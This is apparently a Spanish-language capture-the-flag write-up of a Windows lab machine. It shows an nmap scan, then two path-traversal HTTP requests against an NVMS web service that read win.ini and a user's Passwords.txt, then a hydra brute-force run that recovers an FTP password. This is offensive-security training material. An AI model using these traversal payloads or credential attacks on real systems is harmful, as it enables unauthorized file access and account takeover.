# Enuemración

````
sudo nmap -sVC -p- -sS -T4 10.129.227.77
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-04 11:24 -0600
Nmap scan report for 10.129.227.77
Host is up (0.044s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|_    </html>
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.99%I=7%D=11/4%Time=6AEB6A6D%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xe
SF:f\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\
SF:x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tra
SF:nsitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtm
SF:l\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<s
SF:cript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20w
SF:indow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20
SF:</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOption
SF:s,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-
SF:Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb
SF:\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tr
SF:ansitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transiti
SF:onal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script
SF:\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window
SF:\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scr
SF:ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4
SF:,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Lengt
SF:h:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<
SF:!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transit
SF:ional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\
SF:.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<h
SF:ead>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20t
SF:ype=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loc
SF:ation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\
SF:r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(FourOhFourRequest,65
SF:,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.99%T=SSL%I=7%D=11/4%Time=6AEB6A73%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\x80\x16\x91\x1f\0\0\0\0\x
SF:003\xee\x0cb,5\xbe\x8f\xc9t\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04
SF:jobs\x12\x02\x18\x1e\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nCo
SF:ntent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourReque
SF:st,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not
SF:\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018
SF:\r\n\r\nDocument\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\
SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-04T17:26:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.68 seconds

````

Entramos FTP

no sacamos nada en claro asiq miramos otrso puertos
sacamos cve de NVMS
````
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.129.227.77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
Priority: u=0, i
````

Pillamos password que teniamos la info del ftp
````
GET /../../../../../../../../../../../../Users/nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.129.227.77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
Priority: u=0, i

````

````

hydra -l nadine -P testeopass.txt ftp://10.129.227.77
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-04 11:51:17
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ftp://10.129.227.77:21/
[21][ftp] host: 10.129.227.77   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-04 11:51:18

````

